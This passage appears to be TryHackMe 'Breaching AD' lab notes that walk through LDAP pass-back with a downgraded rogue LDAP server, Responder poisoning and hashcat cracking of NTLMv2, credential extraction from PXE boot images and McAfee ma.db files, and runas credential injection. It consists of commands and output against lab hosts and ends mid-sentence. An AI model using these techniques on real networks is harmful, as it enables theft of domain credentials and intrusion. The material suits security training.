![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d2f78ae2b44ef76453a80144dac86b4e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d2f78ae2b44ef76453a80144dac86b4e.png)

If
 you could gain a foothold on the correct host, such as a Gitlab server,
 it might be as simple as reading the configuration files to recover 
these AD
 credentials. These credentials are often stored in plain text in 
configuration files since the security model relies on keeping the 
location and storage configuration file secure rather than its contents.
 Configuration files are covered in more depth in Task 7.

# LDAP Pass-back Attacks

However,
 one other very interesting attack can be performed against LDAP 
authentication mechanisms, called an LDAP Pass-back attack. This is a 
common attack against network devices, such as printers, when you have 
gained initial access to the internal network, such as plugging in a 
rogue device in a boardroom.

LDAP Pass-back attacks can be 
performed when we gain access to a device's configuration where the LDAP
 parameters are specified. This can be, for example, the web interface 
of a network printer. Usually, the credentials for these interfaces are 
kept to the default ones, such as `admin:admin` or `admin:password`.
 Here, we won't be able to directly extract the LDAP credentials since 
the password is usually hidden. However, we can alter the LDAP 
configuration, such as the IP or hostname of the LDAP server. In an LDAP
 Pass-back attack, we can modify this IP to our IP and then test the 
LDAP configuration, which will force the device to attempt LDAP 
authentication to our rogue device. We can intercept this authentication
 attempt to recover the LDAP credentials.

# Performing an LDAP Pass-back

There is a network printer in this network where the administration website does not even require credentials. Navigate to [http://printer.za.tryhackme.com/settings.aspx](http://printer.za.tryhackme.com/settings.aspx) to find the settings page of the printer:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/b2ab520a2601299ed9bf74d50168ca7d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/b2ab520a2601299ed9bf74d50168ca7d.png)

Using
 browser inspection, we can also verify that the printer website was at 
least secure enough to not just send the LDAP password back to the 
browser:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c7cfe0419d3ebe9534d4caefcd1a5511.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c7cfe0419d3ebe9534d4caefcd1a5511.png)

So
 we have the username, but not the password. However, when we press test
 settings, we can see that an authentication request is made to the 
domain controller to test the LDAP credentials. Let's try to exploit 
this to get the printer to connect to us instead, which would disclose 
the credentials. To do this, let's use a simple Netcat listener to test 
if we can get the printer to connect to us. Since the default port of 
LDAP is 389, we can use the following command:

```
nc -lvp 389
```

Note that if you use the AttackBox, the you should first disable slapd using `service slapd stop`. Then, we can alter the Server input box on the web application to point to our IP and press Test Settings.

**Your IP will be your VPN IP and will either be a 10.50.x.x IP or 10.51.x.x IP.  You can use** `ip a`
 **to list all interfaces. Please make sure to use this as your IP, 
otherwise you will not receive a connection back. Please also make note 
of the interface for this IP, since you will need it later in the task.**

You should see that we get a connection back, but there is a slight problem:

Netcat LDAP Listener

```
[thm@thm]$ nc -lvp 389listening on [any] 389 ...
10.10.10.201: inverse host lookup failed: Unknown host
connect to [10.10.10.55] from (UNKNOWN) [10.10.10.201] 49765
0?DC?;
?
?x
 objectclass0?supportedCapabilities

```

You may require more than one try to receive a connection back but it should respond within 5 seconds. The `supportedCapabilities` response
 tells us we have a problem. Essentially, before the printer sends over 
the credentials, it is trying to negotiate the LDAP authentication 
method details. It will use this negotiation to select the most secure 
authentication method that both the printer and the LDAP server support.
 If the authentication method is too secure, the credentials will not be
 transmitted in cleartext. With some authentication methods, the 
credentials will not be transmitted over the network at all! So we can't
 just use normal Netcat to harvest the credentials. We will need to 
create a rogue LDAP server and configure it insecurely to ensure the 
credentials are sent in plaintext.

# Hosting a Rogue LDAP Server

There
 are several ways to host a rogue LDAP server, but we will use OpenLDAP 
for this example. If you are using the AttackBox, OpenLDAP has already 
been installed for you. However, if you are using your own attack 
machine, you will need to install OpenLDAP using the following command:

```
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd

```

You
 will however have to configure your own rogue LDAP server on the 
AttackBox as well. We will start by reconfiguring the LDAP server using 
the following command:

```
sudo dpkg-reconfigure -p low slapd
```

Make sure to press <No> when requested if you want to skip server configuration:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/97afd26fd4f6d10a2a86ab65ac401845.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/97afd26fd4f6d10a2a86ab65ac401845.png)

For the DNS domain name, you want to provide our target domain, which is `za.tryhackme.com`:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/01b0d4256900cbf48d8d082d8bdf14bb.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/01b0d4256900cbf48d8d082d8bdf14bb.png)

Use this same name for the Organisation name as well:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c4bef0c3f054c32ca982ee9c1608ba1b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c4bef0c3f054c32ca982ee9c1608ba1b.png)

Provide any Administrator password:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/23b957d41ddba8060e4bc2295b56a2fb.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/23b957d41ddba8060e4bc2295b56a2fb.png)

Select MDB as the LDAP database to use:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/07af572567aa32e0e0be2b4d9f54b89a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/07af572567aa32e0e0be2b4d9f54b89a.png)

For the last two options, ensure the database is not removed when purged:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/4d5086da7b25a6f218d6eebdab6d3b71.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/4d5086da7b25a6f218d6eebdab6d3b71.png)

Move old database files before a new one is created:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d383582606e776eb901650ac9799cef5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d383582606e776eb901650ac9799cef5.png)

Before
 using the rogue LDAP server, we need to make it vulnerable by 
downgrading the supported authentication mechanisms. We want to ensure 
that our LDAP server only supports PLAIN and LOGIN authentication 
methods. To do this, we need to create a new ldif file, called with the 
following content:

olcSaslSecProps.ldif

```
#olcSaslSecProps.ldifdn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

The file has the following properties:

- **olcSaslSecProps:** Specifies the SASL security properties
- **noanonymous:** Disables mechanisms that support anonymous login
- **minssf:** Specifies the minimum acceptable security strength with 0, meaning no protection.

Now we can use the ldif file to patch our LDAP server using the following:

```
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```

We can verify that our rogue LDAP server's configuration has been applied using the following command (

**Note**

:
 If you are using Kali, you may not receive any output, however the 
configuration should have worked and you can continue with the next 
steps):

LDAP search to verify supported authentication mechanisms

```
[thm@thm]$ ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanismsdn:
supportedSASLMechanisms: PLAIN
supportedSASLMechanisms: LOGIN
```

# Capturing LDAP Credentials

Our rogue LDAP server has now been configured. When we click the "Test Settings" at [http://printer.za.tryhackme.com/settings.aspx](http://printer.za.tryhackme.com/settings.aspx),
 the authentication will occur in clear text. If you configured your 
rogue LDAP server correctly and it is downgrading the communication, you
 will receive the following error: "This distinguished name contains 
invalid syntax". If you receive this error, you can use a tcpdump to 
capture the credentials using the following command:

TCPDump

```
[thm@thm]$ sudo tcpdump -SX -i breachad tcp port 389tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), snapshot length 262144 bytes
10:41:52.979933 IP 10.10.10.201.49834 > 10.10.10.57.ldap: Flags [P.], seq 4245946075:4245946151, ack 1113052386, win 8212, length 76
	0x0000:  4500 0074 b08c 4000 8006 20e2 0a0a 0ac9  E..t..@.........
	0x0010:  0a0a 0a39 c2aa 0185 fd13 fedb 4257 d4e2  ...9........BW..
	0x0020:  5018 2014 1382 0000 3084 0000 0046 0201  P.......0....F..
	0x0030:  0263 8400 0000 3d04 000a 0100 0a01 0002  .c....=.........
	0x0040:  0100 0201 7801 0100 870b 6f62 6a65 6374  ....x.....object
	0x0050:  636c 6173 7330 8400 0000 1904 1773 7570  class0.......sup
	0x0060:  706f 7274 6564 5341 534c 4d65 6368 616e  portedSASLMechan
	0x0070:  6973 6d73                                isms
10:41:52.979938 IP 10.10.10.57.ldap > 10.10.10.201.49834: Flags [.], ack 4245946151, win 502, length 0
	0x0000:  4500 0028 247d 4000 4006 ed3d 0a0a 0a39  E..($}@.@..=...9
	0x0010:  0a0a 0ac9 0185 c2aa 4257 d4e2 fd13 ff27  ........BW.....'
	0x0020:  5010 01f6 2930 0000                      P...)0..
10:41:52.980162 IP 10.10.10.57.ldap > 10.10.10.201.49834: Flags [P.], seq 1113052386:1113052440, ack 4245946151, win 502, length 54
	0x0000:  4500 005e 247e 4000 4006 ed06 0a0a 0a39  E..^$~@.@......9
	0x0010:  0a0a 0ac9 0185 c2aa 4257 d4e2 fd13 ff27  ........BW.....'
	0x0020:  5018 01f6 2966 0000 3034 0201 0264 2f04  P...)f..04...d/.
	0x0030:  0030 2b30 2904 1773 7570 706f 7274 6564  .0+0)..supported
	0x0040:  5341 534c 4d65 6368 616e 6973 6d73 310e  SASLMechanisms1.
	0x0050:  0405 504c 4149 4e04 054c 4f47 494e       ..PLAIN..LOGIN
[....]
10:41:52.987145 IP 10.10.10.201.49835 > 10.10.10.57.ldap: Flags [.], ack 3088612909, win 8212, length 0
	0x0000:  4500 0028 b092 4000 8006 2128 0a0a 0ac9  E..(..@...!(....
	0x0010:  0a0a 0a39 c2ab 0185 8b05 d64a b818 7e2d  ...9.......J..~-
	0x0020:  5010 2014 0ae4 0000 0000 0000 0000       P.............
10:41:52.989165 IP 10.10.10.201.49835 > 10.10.10.57.ldap: Flags [P.], seq 2332415562:2332415627, ack 3088612909, win 8212, length 65
	0x0000:  4500 0069 b093 4000 8006 20e6 0a0a 0ac9  E..i..@.........
	0x0010:  0a0a 0a39 c2ab 0185 8b05 d64a b818 7e2d  ...9.......J..~-
	0x0020:  5018 2014 3afe 0000 3084 0000 003b 0201  P...:...0....;..
	0x0030:  0560 8400 0000 3202 0102 0418 7a61 2e74  .`....2.....za.t
	0x0040:  7279 6861 636b 6d65 2e63 6f6d 5c73 7663  ryhackme.com\svc
	0x0050:  4c44 4150 8013 7472 7968 6163 6b6d 656c  LDAP..password11

```

Also, note that `password11`
 is an example. The password for your service will be different. You may
 have to press the "Test Settings" button a couple of times before the 
TCPdump will return data since we are performing the attack over a VPN connection.

Now we have another set of valid AD
 credentials! By using an LDAP pass-back attack and downgrading the 
supported authentication mechanism, we could intercept the credentials 
in cleartext.

**Authentication Relays**

Continuing
 with attacks that can be staged from our rogue device, we will now look
 at attacks against broader network authentication protocols. In Windows
 networks, there are a significant amount of services talking to each 
other, allowing users to make use of the services provided by the 
network.

These services have to use built-in 
authentication methods to verify the identity of incoming connections. 
In Task 2, we explored NTLM
 Authentication used on a web application. In this task, we will dive a 
bit deeper to look at how this authentication looks from the network's 
perspective. However, for this task, we will focus on NetNTLM 
authentication used by SMB.

# Server Message Block

The Server Message Block (SMB)
 protocol allows clients (like workstations) to communicate with a 
server (like a file share). In networks that use Microsoft AD, SMB 
governs everything from inter-network file-sharing to remote 
administration. Even the "out of paper" alert your computer receives 
when you try to print a document is the work of the SMB protocol.

However, the security of earlier versions of the SMB
 protocol was deemed insufficient. Several vulnerabilities and exploits 
were discovered that could be leveraged to recover credentials or even 
gain code execution on devices. Although some of these vulnerabilities 
were resolved in newer versions of the protocol, often organisations do 
not enforce the use of more recent versions since legacy systems do not 
support them. We will be looking at two different exploits for NetNTLM 
authentication with SMB:

- Since the NTLM Challenges can be intercepted, we can use offline
cracking techniques to recover the password associated
with the NTLM Challenge. However, this cracking process is significantly slower than cracking NTLM hashes directly.
- We can use
our rogue device to stage a man in the middle attack, relaying the SMB
authentication between the client and server, which will provide us with an active authenticated session and access to the target server.

# LLMNR

In this task, we will take a bit of a look at the authentication that occurs during the use of SMB.
 We will use Responder to attempt to intercept the NetNTLM challenge to 
crack it. There are usually a lot of these challenges flying around on 
the network. Some security solutions even perform a sweep of entire IP 
ranges to recover information from hosts. Sometimes due to stale DNS 
records, these authentication challenges can end up hitting your rogue 
device instead of the intended host.

Responder allows
 us to perform Man-in-the-Middle attacks by poisoning the responses 
during NetNTLM authentication, tricking the client into talking to you 
instead of the actual server they wanted to connect to. On a real LAN, 
Responder will attempt to poison any  Link-Local 
Multicast Name Resolution (LLMNR),  NetBIOS Name Service (NBT-NS), and 
Web Proxy Auto-Discovery (WPAD) requests that are detected. On large 
Windows networks, these protocols allow hosts to
 perform their own local DNS resolution for all hosts on the same local 
network. Rather than overburdening network resources such as the DNS 
servers, hosts can first attempt to determine if the host they are 
looking for is on the same local network by sending out LLMNR requests 
and seeing if any hosts respond. The NBT-NS is the precursor 
protocol to LLMNR, and WPAD requests are made to try and find a proxy 
for
 future HTTP(s) connections.

Since these protocols rely on 
requests broadcasted on the local network, our rogue device 
would also receive these requests. Usually, these requests would simply 
be dropped since they were not meant for our host. However, Responder 
will actively listen to the requests and send poisoned responses 
telling the requesting host that our IP is associated with the 
requested hostname. By poisoning these requests, Responder attempts to 
force the client to connect to our AttackBox. In the same 
line, it starts to host several servers such as SMB, HTTP, SQL, and 
others to capture these requests and force authentication.

# Intercepting NetNTLM Challenge

One
 thing to note is that Responder essentially tries to win the race 
condition by poisoning the connections to ensure that you intercept the 
connection. This means that Responder is usually limited to poisoning 
authentication challenges on the local network. Since we are connected 
via a VPN
 to the network, we will only be able to poison authentication 
challenges that occur on this VPN network. For this reason, we have 
simulated an authentication request that can be poisoned that runs every
 30 minutes. This means that you may have to wait a bit before you can 
intercept the NetNTLM challenge and response.

Although 
Responder would be able to intercept and poison more authentication 
requests when executed from our rogue device connected to the LAN of an 
organisation, it is crucial to understand that this behaviour can be 
disruptive and thus detected. By poisoning authentication requests, 
normal network authentication attempts would fail, meaning users and 
services would not connect to the hosts and shares they intend to. Do 
keep this in mind when using Responder on a security assessment.

Responder
 has already been installed on the AttackBox. However, if you are not 
using the AttackBox, you can download and install it from this repo:  [https://github.com/lgandx/Responder](https://github.com/lgandx/Responder). We will set Responder to run on the interface connected to the VPN:

`sudo responder -I breachad`

If
 you are using the AttackBox not all of the Responder services will be 
able to start since other services are already using those ports. 
However, this will not impact this task. Responder will now listen for 
any

LLMNR

,
 NBT-NS, or WPAD requests that are coming in. We would leave Responder 
to run for a bit on a real LAN. However, in our case, we have to 
simulate this poisoning by having one of the servers attempt to 
authenticate to machines on the VPN. Leave Responder running for a bit 
(average 10 minutes, get some fresh air!), and you should receive an 
SMBv2 connection which Responder can use to entice and extract an 
NTLMv2-SSP response. It will look something like this:

NTLM Password Spraying Attack

```
[+] Listening for events...
[SMBv2] NTLMv2-SSP Client   : <Client IP>
[SMBv2] NTLMv2-SSP Username : ZA\<Service Account Username>
[SMBv2] NTLMv2-SSP Hash     : <Service Account Username>::ZA:<NTLMv2-SSP Hash>
```

If we were using our rogue device, we would probably run 
Responder for quite some time, capturing several responses. Once we have
 a couple, we can start to perform some offline cracking of the 
responses in the hopes of recovering their associated NTLM
 passwords. If the accounts have weak passwords configured, we have a 
good chance of successfully cracking them. Copy the NTLMv2-SSP Hash to a
 textfile. We will then use the password list provided in the 
downloadable files for this task and Hashcat in an attempt to crack the 
hash using the following command:

`hashcat -m 5600 <hash file> <password file>   --force`

The password file has been provided for you on the AttackBox in the `/root/Rooms/BreachingAD/task5/`
 directory or as a downloadable task file. We use hashtype 5600, which 
corresponds with NTLMv2-SSP for hashcat. If you use your own machine, 
you will have to install [Hashcat](https://hashcat.net/hashcat/) first.

Any hashes that we can crack will now provide us with AD credentials for our breach!

# Relaying the Challenge

In
 some instances, however, we can take this a step further by trying to 
relay the challenge instead of just capturing it directly. This is a 
little bit more difficult to do without prior knowledge of the accounts 
since this attack depends on the permissions of the associated account. 
We need a couple of things to play in our favour:

- SMB Signing should either be disabled or enabled but not enforced. When we
perform a relay, we make minor changes to the request to pass it along.
If SMB signing is enabled, we won't be able to forge the message
signature, meaning the server would reject it.
- The
associated account needs the relevant permissions on the server to
access the requested resources. Ideally, we are looking to relay the
challenge and response of an account with administrative privileges over the server, as this would allow us to gain a foothold on the host.
- Since we technically don't yet have an AD foothold, some guesswork is involved into what accounts will have
permissions on which hosts. If we had already breached AD, we could
perform some initial enumeration first, which is usually the case.

This is why blind relays are not usually popular. Ideally, you would first breach AD
 using another method and then perform enumeration to determine the 
privileges associated with the account you have compromised. From here, 
you can usually perform lateral movement for privilege escalation across
 the domain. However, it is still good to fundamentally under how a 
relay attack works, as shown in the diagram below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6baba3537d36d0fa78c6f61cf1386f6f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6baba3537d36d0fa78c6f61cf1386f6f.png)

If you want to try this type of attack in action, head over to the [Holo Network](https://tryhackme.com/jr/hololive). We will also come back to this one in future AD Rooms.

**Microsoft Deployment Toolkit**

Large 
organisations need tools to deploy and manage the infrastructure of the 
estate. In massive organisations, you can't have your IT personnel using
 DVDs or even USB Flash drives running around installing software on 
every single machine. Luckily, Microsoft already provides the tools 
required to manage the estate. However, we can exploit misconfigurations
 in these tools to also breach AD.

# MDT and SCCM

Microsoft Deployment Toolkit (MDT) is a Microsoft service that 
assists with automating the deployment of Microsoft Operating Systems 
(OS). Large organisations use services such as MDT to help deploy new 
images in their estate more efficiently since the base images can be 
maintained and updated in a central location.

# 

Usually,
 MDT is integrated with Microsoft's System Center Configuration Manager 
(SCCM), which manages all updates for all Microsoft applications, 
services, and operating systems. MDT is used for new deployments. 
Essentially it allows the IT team to preconfigure and manage boot 
images. Hence, if they need to configure a new machine, they just need 
to plug in a network cable, and everything happens automatically. They 
can make various changes to the boot image, such as already installing 
default software like Office365 and the organisation's anti-virus of 
choice. It can also ensure that the new build is updated the first time 
the installation runs.

SCCM can be seen as almost an expansion and
 the big brother to MDT. What happens to the software after it is 
installed? Well, SCCM does this type of patch management. It allows the 
IT team to review available updates to all software installed across the
 estate. The team can also test these patches in a sandbox environment 
to ensure they are stable before centrally deploying them to all 
domain-joined machines. It makes the life of the IT team significantly 
easier.

However, anything that provides central management of 
infrastructure such as MDT and SCCM can also be targetted by attackers 
in an attempt to take over large portions of critical functions in the 
estate. Although MDT can be configured in various ways, for this task, 
we will focus exclusively on a configuration called Preboot Execution 
Environment (PXE) boot.

# PXE Boot

Large organisations use PXE boot to allow new devices that are connected to the network to load and install the OS
 directly over a network connection. MDT can be used to create, manage, 
and host PXE boot images. PXE boot is usually integrated with DHCP, 
which means that if DHCP assigns an IP lease, the host is allowed to 
request the PXE boot image and start the network OS installation 
process. The communication flow is shown in the diagram below**:**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/8117a18103e98ee2ccda91fc87c63606.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/8117a18103e98ee2ccda91fc87c63606.png)

Once
 the process is performed, the client will use a TFTP connection to 
download the PXE boot image. We can exploit the PXE boot image for two 
different purposes:

- Inject a privilege escalation vector, such as a Local Administrator account, to gain Administrative access to the OS once the PXE boot has been completed.
- Perform password scraping attacks to recover AD credentials used during the install.

In
 this task, we will focus on the latter. We will attempt to recover the 
deployment service account associated with the MDT service during 
installation for this password scraping attack. Furthermore, there is 
also the possibility of retrieving other AD accounts used for the unattended installation of applications and services.

# PXE Boot Image Retrieval

Since DHCP
 is a bit finicky, we will bypass the initial steps of this attack. We 
will skip the part where we attempt to request an IP and the PXE boot 
preconfigure details from DHCP. We will perform the rest of the attack 
from this step in the process manually.

The first piece of information regarding the PXE Boot preconfigure you would have received via DHCP is the IP of the MDT server. In our case, you can recover that information from the TryHackMe network diagram.

The
 second piece of information you would have received was the names of 
the BCD files. These files store the information relevant to PXE Boots 
for the different types of architecture. To retrieve this information, 
you will need to connect to this website: [http://pxeboot.za.tryhackme.com](http://pxeboot.za.tryhackme.com/). It will list various BCD files:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/63264e3ddce1a8b438a7c8b6d527688c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/63264e3ddce1a8b438a7c8b6d527688c.png)

Usually,
 you would use TFTP to request each of these BCD files and enumerate the
 configuration for all of them. However, in the interest of time, we 
will focus on the BCD file of the **x64** architecture. Copy and store the full name of this file. For the rest of this exercise, we will be using this name placeholder `x64{7B...B3}.bcd`
 since the files and their names are regenerated by MDT every day. Each 
time you see this placeholder, remember to replace it with your specific
 BCD filename. **Note as well that if the network has just started, 
these file names will only update after 10 mintes of the network being 
active.**

With this initial information now recovered from DHCP
 (wink wink), we can enumerate and retrieve the PXE Boot image. We will 
be using our SSH connection on THMJMP1 for the next couple of steps, so 
please authenticate to this SSH session using the following:

`ssh thm@THMJMP1.za.tryhackme.com`

and the password of `Password1@`.

To ensure that all users of the network can use SSH, start by creating a folder with your username and copying the powerpxe repo into this folder:

SSH Command Prompt

```markup
C:\Users\THM>cd Documents
C:\Users\THM\Documents> mkdir <username>
C:\Users\THM\Documents> copy C:\powerpxe <username>\
C:\Users\THM\Documents\> cd <username>
```

The first step we need to perform is using T

FTP

and downloading our BCD file to read the configuration of the MDT 
server. TFTP is a bit trickier than FTP since we can't list files. 
Instead, we send a file request, and the server will connect back to us 
via UDP to transfer the file. Hence, we need to be accurate when 
specifying files and file paths. The BCD files are always located in the
 /Tmp/ directory on the MDT server. We can initiate the TFTP transfer 
using the following command in our SSH session:

SSH Command Prompt

```markup
C:\Users\THM\Documents\Am0> tftp -i <THMMDT IP> GET "\Tmp\x64{39...28}.bcd" conf.bcd
Transfer successful: 12288 bytes in 1 second(s), 12288 bytes/s
```

You will have to lookup THMMDT IP with

```
nslookup thmmdt.za.tryhackme.com
```

. With the BCD file now recovered, we will be using

[powerpxe](https://github.com/wavestone-cdt/powerpxe)

to read its contents. Powerpxe is a

PowerShell

script that automatically performs this type of attack but usually with
 varying results, so it is better to perform a manual approach. We will 
use the Get-WimFile function of powerpxe to recover the locations of the PXE Boot images from the BCD file:

SSH Command Prompt

```markup
C:\Users\THM\Documents\Am0> powershell -executionpolicy bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\THM\Documents\am0> Import-Module .\PowerPXE.ps1
PS C:\Users\THM\Documents\am0> $BCDFile = "conf.bcd"
PS C:\Users\THM\Documents\am0> Get-WimFile -bcdFile $BCDFile
>> Parse the BCD file: conf.bcd
>>>> Identify wim file : <PXE Boot Image Location><PXE Boot Image Location>
```

WIM
 files are bootable images in the Windows Imaging Format (WIM). Now that
 we have the location of the PXE Boot image, we can again use TFTP to 
download this image:

SSH Command Prompt

```markup
PS C:\Users\THM\Documents\am0> tftp -i <THMMDT IP> GET "<PXE Boot Image Location>" pxeboot.wim
Transfer successful: 341899611 bytes in 218 second(s), 1568346 bytes/s
```

This
 download will take a while since you are downloading a fully bootable 
and configured Windows image. Maybe stretch your legs and grab a glass 
of water while you wait.

# Recovering Credentials from a PXE Boot Image

Now
 that we have recovered the PXE Boot image, we can exfiltrate stored 
credentials. It should be noted that there are various attacks that we 
could stage. We could inject a local administrator user, so we have 
admin access as soon as the image boots, we could install the image to 
have a domain-joined machine. If you are interested in learning more 
about these attacks, you can read this [article](https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/). This exercise will focus on a simple attack of just attempting to exfiltrate credentials.

Again
 we will use powerpxe to recover the credentials, but you could also do 
this step manually by extracting the image and looking for the 
bootstrap.ini file, where these types of credentials are often stored. 
To use powerpxe to recover the credentials from the bootstrap file, run 
the following command:

SSH Command Prompt

```markup
PS C:\Users\THM\Documents\am0> Get-FindCredentials -WimFile pxeboot.wim
>> Open pxeboot.wim
>>>> Finding Bootstrap.ini
>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$
>>>> >>>> UserID = <account>
>>>> >>>> UserDomain = ZA
>>>> >>>> UserPassword = <password>
```

As you can see, powerpxe was able to recover the AD credentials. We now have another set of AD credentials that we can use!

**Configuration Files**

The 
last enumeration avenue we will explore in this network is configuration
 files. Suppose you were lucky enough to cause a breach that gave you 
access to a host on the organisation's network. In that case, 
configuration files are an excellent avenue to explore in an attempt to 
recover AD credentials. Depending on the host that was breached, various configuration files may be of value for enumeration:

- Web application config files
- Service configuration files
- Registry keys
- Centrally deployed applications

Several enumeration scripts, such as [Seatbelt](https://github.com/GhostPack/Seatbelt), can be used to automate this process.

# Configuration File Credentials

However,
 we will focus on recovering credentials from a centrally deployed 
application in this task. Usually, these applications need a method to 
authenticate to the domain during both the installation and execution 
phases. An example of such as application is McAfee Enterprise Endpoint 
Security, which organisations can use as the endpoint detection and 
response tool for security.

McAfee embeds the 
credentials used during installation to connect back to the orchestrator
 in a file called ma.db. This database file can be retrieved and read 
with local access to the host to recover the associated AD service account. We will be using the SSH access on THMJMP1 again for this exercise.

The ma.db file is stored in a fixed location:

SSH Command Prompt

```
thm@THMJMP1 C:\Users\THM>cd C:\ProgramData\McAfee\Agent\DB
thm@THMJMP1 C:\ProgramData\McAfee\Agent\DB>dir
 Volume in drive C is Windows 10
 Volume Serial Number is 6A0F-AA0F

 Directory of C:\ProgramData\McAfee\Agent\DB

03/05/2022  10:03 AM    <DIR>          .
03/05/2022  10:03 AM    <DIR>          ..
03/05/2022  10:03 AM           120,832 ma.db
               1 File(s)        120,832 bytes
               2 Dir(s)  39,426,285,568 bytes free
```

We can use SCP to copy the ma.db to our AttackBox:

Terminal

```
thm@thm:~/thm# scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .thm@10.200.4.249's password:
ma.db 100%  118KB 144.1KB/s   00:00
```

To read the database file, we will use a tool called sqlitebrowser. We can open the database using the following command:

Terminal

```
thm@thm:# sqlitebrowser ma.db
```

Using sqlitebrowser, we will select the Browse Data option and focus on the AGENT_REPOSITORIES table:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/aeda85be24462cc6a3f0c03cd899053a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/aeda85be24462cc6a3f0c03cd899053a.png)

We
 are particularly interested in the second entry focusing on the DOMAIN,
 AUTH_USER, and AUTH_PASSWD field entries. Make a note of the values 
stored in these entries. However, the AUTH_PASSWD field is encrypted. 
Luckily, McAfee encrypts this field with a known key. Therefore, we will
 use the following old python2 script to decrypt the password. The 
script has been provided as a downloadable task file or on the 
AttackBox, it can be found in the `/root/Rooms/BreachingAD/task7/` directory.

**Note:
 The tool we will use here is quite old. It uses Python v2 and relies on
 an old crypto library. If you cannot get the script to work on your own
 VM,
 please make use of the AttackBox. However, there has been a recent 
update to the application to ensure that it works on Python3 as well, 
you can download the latest version here: [https://github.com/funoverip/mcafee-sitelist-pwd-decryption](https://github.com/funoverip/mcafee-sitelist-pwd-decryption)**

You will have to unzip the mcafee-sitelist-pwd-decryption.zip file:

Terminal

```
thm@thm:~/root/Rooms/BreachingAD/task7/$ unzip mcafeesitelistpwddecryption.zip
```

By providing the script with our base64 encoded and encrypted password, the script will provide the decrypted password:

Terminal

```
thm@thm:~/root/Rooms/BreachingAD/task7/mcafee-sitelist-pwd-decryption-master$ python2 mcafee_sitelist_pwd_decrypt.py <AUTH PASSWD VALUE>
Crypted password   : <AUTH PASSWD VALUE>
Decrypted password : <Decrypted Pasword>
```

We now once again have a set of AD
 credentials that we can use for further enumeration! This is just one 
example of recovering credentials from configuration files. If you are 
ever able to gain a foothold on a host, make sure to follow a detailed 
and refined methodology to ensure that you recover all loot from the 
host, including credentials and other sensitive information that can be 
stored in configuration files.

**ENUMERATING ACTIVE DIRECTORY**

**Credential Injection**

Before jumping into AD
 objects and enumeration, let's first talk about credential injection 
methods. From the Breaching AD network, you would have seen that 
credentials are often found without compromising a domain-joined 
machine. Specific enumeration techniques may require a particular setup 
to work.

# Windows vs

*"If
 you know the enemy and know yourself, you need not fear the results of a
 hundred battles. If you know yourself but not the enemy, for every 
victory gained you will also suffer defeat."* - Sun Tzu, Art of War.

You can get incredibly far doing AD
 enumeration from a Kali machine. Still, if you genuinely want to do 
in-depth enumeration and even exploitation, you need to understand and 
mimic your enemy. Thus, you need a Windows machine. This will allow us 
to use several built-in methods to stage our enumeration and exploits. 
In this network, we will explore one of these built-in tools, called the
 `runas.exe` binary.

# Runas Explained

Have you ever found AD credentials but nowhere to log in with them? Runas may be the answer you've been looking for!

In security assessments, you will often have network access and have just discovered AD
 credentials but have no means or privileges to create a new 
domain-joined machine. So we need the ability to use those credentials 
on a Windows machine we control.

If we have the AD credentials in the format of :,
 we can use Runas, a legitimate Windows binary, to inject the 
credentials into memory. The usual Runas command would look something 
like this:

```
runas.exe /netonly /user:<domain>\<username> cmd.exe
```

Let's look at the parameters:

- **/netonly** - Since we are not domain-joined, we want to load the credentials for
